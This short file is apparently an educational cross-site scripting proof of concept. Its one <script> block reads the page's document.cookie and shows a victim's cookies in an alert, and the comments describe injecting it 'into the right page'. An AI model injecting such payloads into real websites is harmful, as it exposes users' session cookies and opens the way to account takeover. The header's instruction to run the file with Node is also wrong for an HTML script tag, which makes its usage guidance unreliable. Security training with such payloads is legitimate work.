// Created August 16th, 2023 - By: Devon Griffith A.K.A. rootPHAGE / 我爱数据
// Run on Windows [ Node <path to file>\XSS_via_Cookies_JavaScript.js ]
// XSS via Cookies = This script retrieves and displays the user's cookies, if we're able to get it into the right page

<script>
  var cookies = document.cookie;
  alert('Your cookies: ' + cookies);  // Displays the victims cookies for us (unformatted)
</script>

// DO NOT USE THIS SCRIPT MALICIOUSLY - PROVIDED FOR EDUCATIONAL PURPOSES ONLY
